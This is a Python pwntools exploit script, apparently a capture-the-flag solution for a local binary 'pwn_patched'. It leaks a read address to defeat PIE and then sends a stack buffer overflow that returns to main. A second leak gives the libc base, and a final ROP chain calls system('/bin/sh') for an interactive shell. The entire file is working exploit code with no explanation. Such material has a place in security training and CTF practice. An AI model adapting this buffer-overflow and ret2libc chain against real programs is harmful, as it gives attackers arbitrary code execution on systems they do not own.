from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn_patched')
#p = remote('127.0.0.1',43695)
libc = ELF('./libc.so.6')
read_offest = 0x1060
main_offest = 0x11ce
ret_offset = 0x101a
p.recvuntil(b'How can I use ')
leak_data = p.recvuntil(b" without a backdoor? Damn!", drop=True)
leak_read = int(leak_data,0)
log.success(f"泄露的read地址: {hex(leak_read)}")
pie_base = leak_read - read_offest
log.success(f"泄露的pie基址: {hex(pie_base)}")
main_add = main_offest + pie_base
ret = ret_offset + pie_base
payload1 = flat([
    b'A' * 40,
    ret,
    main_add
])
sleep(0.1)
p.send(payload1)
p.recvuntil(b'How can I use ')
leak_data = p.recvuntil(b" without a backdoor? Damn!", drop=True)
leak_read = int(leak_data,0)
log.success(f"泄露的read_libc地址: {hex(leak_read)}")
libc_base = leak_read - libc.sym['read']
log.success(f"泄露的libc基址: {hex(libc_base)}")
rdi_offset = 0x2a3e5
prdi = rdi_offset + libc_base
libc.address = libc_base
system = libc.sym['system']
bin_add = next(libc.search(b'/bin/sh'))
payload2 = flat([
    b'A' * 40,
    ret,
    prdi,
    bin_add,
    system
])
sleep(0.1)
p.send(payload2)
p.interactive()
